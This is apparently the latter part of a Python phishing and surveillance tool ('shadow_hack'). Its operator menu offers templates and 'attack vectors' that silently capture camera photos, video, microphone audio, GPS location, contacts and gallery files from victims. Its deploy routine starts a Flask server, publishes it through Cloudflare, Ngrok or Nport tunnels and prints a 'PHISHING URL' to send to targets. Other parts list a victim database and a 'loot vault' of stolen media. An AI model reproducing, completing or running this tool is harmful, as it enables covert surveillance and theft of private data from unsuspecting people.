        print(f"\n  \033[1;30m╭──(\033[0m\033[1;31mroot💀technical_sam\033[0m\033[1;30m)-[\033[0m\033[1;37m~/shadow_hack\033[0m\033[1;30m]\033[0m")
        print(f"  \033[1;30m╰─$\033[0m \033[1;37m./status\033[0m\n")
        print(f"  \033[1;36m  ⚙️  Configuration")
        print(f"  \033[1;30m  ─────────────────────────────────────────────────\033[0m")
        print(f"  \033[1;37m  🎨 Template  :\033[0m \033[1;33m[{current_tpl}]\033[0m \033[1;37m{TEMPLATES[current_tpl]['name']}\033[0m")
        print(f"  \033[1;37m  🎯 Vector    :\033[0m \033[1;33m[{current_mode}]\033[0m \033[1;37m{mode_names[current_mode]}\033[0m")
        if current_mode==8:print(f"  \033[1;37m  🎛️  Combo     :\033[0m \033[1;33m[{custom_str}]\033[0m")
        print(f"  \033[1;37m  ⏱️  Window    :\033[0m \033[1;33m{DURATION}s\033[0m")
        print(f"  \033[1;37m  📡 Server    :\033[0m \033[1;33m{tm.get(TUNNEL_METHOD,TUNNEL_METHOD)}\033[0m")
        print(f"  \033[1;37m  🔑 Ngrok Key :\033[0m \033[1;33m{'✅ Set' if NGROK_TOKEN else '❌ Not Set'}\033[0m")
        print(f"  \033[1;37m  📂 Prefix    :\033[0m \033[1;33m{FOLDER_PREFIX if FOLDER_PREFIX else 'AUTO'}\033[0m")
        print(f"  \033[1;37m  👥 Victims   :\033[0m \033[1;32m{total_victims}\033[0m  \033[1;37m📤 Extracted :\033[0m \033[1;32m{total_extractions}\033[0m")
        print(f"\n  \033[1;36m  📋 Main Menu")
        print(f"  \033[1;30m  ─────────────────────────────────────────────────\033[0m")
        print(f"  \033[1;36m  [1]\033[0m  🚀 \033[1;37mDeploy Campaign\033[0m")
        print(f"  \033[1;36m  [2]\033[0m  🎨 \033[1;37mSelect Template\033[0m")
        print(f"  \033[1;36m  [3]\033[0m  🎯 \033[1;37mSelect Attack Vector\033[0m")
        print(f"  \033[1;36m  [4]\033[0m  🎛️  \033[1;37mCustom Combo\033[0m")
        print(f"  \033[1;36m  [5]\033[0m  ⏱️  \033[1;37mCapture Window\033[0m")
        print(f"  \033[1;36m  [6]\033[0m  📡 \033[1;37mChoose Server\033[0m")
        print(f"  \033[1;36m  [7]\033[0m  🔑 \033[1;37mNgrok Token\033[0m")
        print(f"  \033[1;36m  [8]\033[0m  📂 \033[1;37mFolder Prefix\033[0m")
        print(f"  \033[1;36m  [9]\033[0m  👁️  \033[1;37mVictim Database\033[0m")
        print(f"  \033[1;36m  [10]\033[0m 📁 \033[1;37mLoot Vault\033[0m")
        print(f"  \033[1;36m  [0]\033[0m  🚪 \033[1;37mVanish\033[0m")
        print(f"  \033[1;30m  ─────────────────────────────────────────────────\033[0m")
        choice=input("  \033[1;30m╰─$\033[0m ").strip()
        if choice=='1':deploy()
        elif choice=='2':sel_tpl()
        elif choice=='3':sel_mod()
        elif choice=='4':custom_combo()
        elif choice=='5':set_dur()
        elif choice=='6':choose_server()
        elif choice=='7':set_ngrok_token()
        elif choice=='8':set_pfx()
        elif choice=='9':view_db()
        elif choice=='10':view_loot()
        elif choice=='0':print(f"\n  \033[1;35m[💀] You don't need friends. You just need root access.\033[0m");sys.exit(0)
        else:hp("❌","Invalid","31");time.sleep(0.3)

def custom_combo():
    global current_mode,CUSTOM_MODES
    os.system('clear')
    print(f"\n  \033[1;35m🎛️  CUSTOM COMBO SELECTOR\033[0m\n")
    print(f"  \033[1;37m  Choose modes by comma (e.g., 1,4 for Camera+GPS)\033[0m\n")
    print(f"  \033[1;36m  [1]\033[0m 📸 Camera Burst")
    print(f"  \033[1;36m  [2]\033[0m 🎥 Video Capture")
    print(f"  \033[1;36m  [3]\033[0m 🎙️ Audio Intercept")
    print(f"  \033[1;36m  [4]\033[0m 📍 GPS Extraction")
    print(f"  \033[1;36m  [5]\033[0m 📇 Contacts Harvest")
    print(f"  \033[1;36m  [6]\033[0m 🖼️ Gallery Breach")
    print(f"  \033[1;36m  [0]\033[0m ↩️  Back\n")
    choice=input("  \033[1;30m╰─$\033[0m \033[1;37mcombo >\033[0m ").strip()
    if choice=='0':return
    try:
        modes=[int(x.strip()) for x in choice.split(',') if x.strip().isdigit()]
        valid=[m for m in modes if 1<=m<=6]
        if valid:
            CUSTOM_MODES=valid;current_mode=8
            names={1:"📸 Camera",2:"🎥 Video",3:"🎙️ Audio",4:"📍 GPS",5:"📇 Contacts",6:"🖼️ Gallery"}
            selected=[names.get(m,f"?{m}") for m in valid]
            hp("✅",f"COMBO: {', '.join(selected)}","32")
            hp("💡","Mode auto-set to [8] Custom Combo","33")
        else:hp("❌","No valid modes (1-6)","31")
    except:hp("❌","Invalid format. Use: 1,4","31")
    time.sleep(0.8)

def choose_server():
    global TUNNEL_METHOD
    while True:
        os.system('clear')
        print(f"\n  \033[1;35m📡 SELECT TUNNEL / SERVER\033[0m\n")
        print(f"  \033[1;37m  Current: \033[1;33m{TUNNEL_METHOD}\033[0m\n")
        print(f"  \033[1;36m  [1]\033[0m  ☁️  Cloudflare Tunnel")
        print(f"  \033[1;36m  [2]\033[0m  🟣 Ngrok")
        print(f"  \033[1;36m  [3]\033[0m  🔵 Nport")
        print(f"  \033[1;36m  [0]\033[0m  ↩️  Back")
        c=input("  \033[1;30m╰─$\033[0m ").strip()
        if c=='1':TUNNEL_METHOD='cloudflare';hp("☁️","Selected Cloudflare","36");break
        elif c=='2':TUNNEL_METHOD='ngrok';hp("🟣","Selected Ngrok","36");break
        elif c=='3':TUNNEL_METHOD='nport';hp("🔵","Selected Nport","36");break
        elif c=='0':break

def set_ngrok_token():
    global NGROK_TOKEN
    os.system('clear')
    print(f"\n  \033[1;35m🔑 SET NGROK AUTH TOKEN\033[0m\n")
    print(f"  \033[1;30m  Get token: https://dashboard.ngrok.com/get-started/your-authtoken\033[0m")
    print(f"  \033[1;37m  Current: \033[1;33m{NGROK_TOKEN if NGROK_TOKEN else 'Not Set'}\033[0m\n")
    token=input("  \033[1;30m╰─$\033[0m \033[1;37mpaste token >\033[0m ").strip()
    if token:NGROK_TOKEN=token;hp("✅","Ngrok token saved!","32")
    else:hp("⚠️","Token unchanged","33")
    time.sleep(0.5)

def sel_tpl():
    global current_tpl
    os.system('clear');print("\n  \033[1;35m🎨 SELECT TEMPLATE\033[0m\n")
    for k,v in TEMPLATES.items():print(f"  \033[1;36m[{k:2d}]\033[0m {v['icon']} \033[1;37m{v['name']}\033[0m")
    try:
        ch=int(input("\n  \033[1;30m╰─$\033[0m \033[1;37mtemplate >\033[0m ").strip())
        if ch in TEMPLATES:current_tpl=ch;hp("✅",f"ARMED: {TEMPLATES[ch]['name']}","32")
    except:hp("❌","Invalid","31")

def sel_mod():
    global current_mode
    os.system('clear');print("\n  \033[1;35m🎯 SELECT ATTACK VECTOR\033[0m\n")
    modes={1:"📸 Camera Burst — Silent photos every 0.8s",2:"🎥 Video Capture — Records video+audio (webm)",3:"🎙️ Audio Intercept — Microphone recording",4:"📍 GPS Extraction — Live coordinates",5:"📇 Contacts Harvest — Phonebook dump",6:"🖼️ Gallery Breach — Victim selects files",7:"💀 FULL GHOST — All vectors",8:"🎛️ Custom Combo — Pick your own"}
    for k,v in modes.items():print(f"  \033[1;36m[{k}]\033[0m \033[1;37m{v}\033[0m")
    try:
        ch=int(input("\n  \033[1;30m╰─$\033[0m \033[1;37mvector >\033[0m ").strip())
        if ch in modes:current_mode=ch;hp("✅",f"VECTOR: {modes[ch]}","32")
    except:hp("❌","Invalid","31")

def set_dur():
    global DURATION
    try:
        d=int(input("  \033[1;30m╰─$\033[0m \033[1;37mseconds (1-120) >\033[0m ").strip())
        if 1<=d<=120:DURATION=d;hp("✅",f"Window: {DURATION}s","32")
    except:hp("❌","Invalid","31")

def set_pfx():
    global FOLDER_PREFIX
    n=input("  \033[1;30m╰─$\033[0m \033[1;37mprefix (enter=auto) >\033[0m ").strip()
    FOLDER_PREFIX=re.sub(r'[^a-zA-Z0-9_-]','_',n) if n else""
    hp("✅",f"Prefix: {FOLDER_PREFIX if FOLDER_PREFIX else 'AUTO'}","32")

def deploy():
    global total_victims,total_extractions,ACTIVE_SESSIONS,tunnel_proc
    os.system('clear')
    mode_names_full={1:"📸 Camera Burst",2:"🎥 Video Capture",3:"🎙️ Audio Intercept",4:"📍 GPS Extraction",5:"📇 Contacts Harvest",6:"🖼️ Gallery Breach",7:"💀 FULL GHOST",8:"🎛️ Custom Combo"}
    tm={"cloudflare":"☁️ Cloudflare","ngrok":"🟣 Ngrok","nport":"🔵 Nport"}
    custom_str=",".join([str(m) for m in CUSTOM_MODES]) if CUSTOM_MODES else "None"
    print(f"\n  \033[1;35m╔══════════════════════════════════════════════╗\033[0m")
    print(f"  \033[1;35m║\033[0m       \033[1;37m🚀 DEPLOYING SHADOW CAMPAIGN\033[0m            \033[1;35m║\033[0m")
    print(f"  \033[1;35m╠══════════════════════════════════════════════╣\033[0m")
    print(f"  \033[1;35m║\033[0m  🎨 {TEMPLATES[current_tpl]['name']:<38}\033[1;35m║\033[0m")
    print(f"  \033[1;35m║\033[0m  🎯 {mode_names_full[current_mode]:<38}\033[1;35m║\033[0m")
    if current_mode==8:print(f"  \033[1;35m║\033[0m  🎛️  Combo: {custom_str:<32}\033[1;35m║\033[0m")
    print(f"  \033[1;35m║\033[0m  ⏱️  {DURATION}s | 📡 {tm.get(TUNNEL_METHOD,TUNNEL_METHOD):<24}\033[1;35m║\033[0m")
    print(f"  \033[1;35m╚══════════════════════════════════════════════╝\033[0m")
    ACTIVE_SESSIONS.clear();total_victims=0;total_extractions=0
    hp("🔧","Booting Flask server...","33")
    import logging;logging.getLogger('werkzeug').setLevel(logging.ERROR)
    threading.Thread(target=lambda:app.run(host='0.0.0.0',port=PORT,debug=False,use_reloader=False),daemon=True).start()
    time.sleep(2)
    tunnels={"cloudflare":tunnel_cloudflare,"ngrok":tunnel_ngrok,"nport":tunnel_nport}
    url,tunnel_proc=tunnels.get(TUNNEL_METHOD,tunnel_cloudflare)(PORT)
    if url:
        print(f"\n  \033[1;35m{'═'*50}\033[0m")
        print(f"  \033[1;32m🔗 PHISHING URL:\033[0m")
        print(f"  \033[1;37;44m  {url}  \033[0m")
        print(f"  \033[1;35m{'═'*50}\033[0m")
        print(f"  \033[1;30m  [!] Send to target. Ctrl+C to abort\033[0m")
        print(f"  \033[1;35m{'─'*50}\033[0m")
        try:
            while True:time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n  \033[1;35m[💀] CAMPAIGN TERMINATED\033[0m")
            print(f"  \033[1;37m  👥 Victims  :\033[0m \033[1;32m{total_victims}\033[0m  \033[1;37m📤 Extracted :\033[0m \033[1;32m{total_extractions}\033[0m")
            if tunnel_proc:tunnel_proc.terminate()
            os._exit(0)
    else:
        hp("⚠️","Tunnel failed — local only","33")
        hp("💡",f"Local URL: http://localhost:{PORT}","33")
        try:
            while True:time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n  \033[1;35m[💀] Stopped — {total_victims}v | {total_extractions}p\033[0m")
            os._exit(0)

def view_db():
    os.system('clear');print("\n  \033[1;35m👁️  VICTIM DATABASE\033[0m\n")
    if LOG_FILE.exists():
        try:
            with open(LOG_FILE) as f:c=f.read().strip()
            if c:
                logs=json.loads(c)
                if isinstance(logs,list)and logs:
                    print(f"  \033[1;37mTotal Records:\033[0m \033[1;32m{len(logs)}\033[0m\n")
                    vics={}
                    for e in logs:vics.setdefault(e.get('name','?'),[]).append(e)
                    for n,es in list(vics.items())[-20:]:
                        types=set(e.get('type','?')for e in es);ips=set(e.get('ip','?')for e in es)
                        print(f"  \033[1;36m👤 {n}\033[0m")
                        print(f"     \033[1;30mIP: {', '.join(ips)} | Data: {', '.join(types)} | Hits: {len(es)}\033[0m")
                else:print("  \033[1;33mNo records yet.\033[0m")
        except:print("  \033[1;31mError reading database.\033[0m")
    else:print("  \033[1;33mDatabase empty. Deploy first.\033[0m")
    input("  \033[1;37m[Enter] to continue...\033[0m")

def view_loot():
    os.system('clear');print("\n  \033[1;35m📁 LOOT VAULT\033[0m\n")
    if LOOT_DIR.exists():
        items=sorted([d for d in LOOT_DIR.iterdir() if d.is_dir()],key=lambda x:x.name,reverse=True)
        print(f"  \033[1;37mPath   :\033[0m \033[1;33m{LOOT_DIR.absolute()}\033[0m")
        print(f"  \033[1;37mFolders:\033[0m \033[1;32m{len(items)}\033[0m\n")
        for item in items[:15]:
            files=[f for f in item.rglob('*')if f.is_file()]
            sz=sum(f.stat().st_size for f in files)
            ph=len([f for f in files if f.suffix=='.jpg'])
            vi=len([f for f in files if f.suffix=='.webm'and'video'in f.name])
            au=len([f for f in files if f.suffix=='.webm'and'audio'in f.name])
            parts=[]
            if ph:parts.append(f"📸{ph}")
            if vi:parts.append(f"🎥{vi}")
            if au:parts.append(f"🎙️{au}")
            print(f"  📁 \033[1;37m{item.name}\033[0m")
            print(f"     \033[1;30m{' '.join(parts)if parts else f'{len(files)} files'} | {sz//1024}KB\033[0m")
    else:print("  \033[1;33mVault empty. Deploy first.\033[0m")
    input("  \033[1;37m[Enter] to continue...\033[0m")

if __name__=='__main__':
    try:menu()
    except KeyboardInterrupt:print(f"\n\n  \033[1;35m[💀] You don't need friends. You just need root access.\033[0m");sys.exit(0)
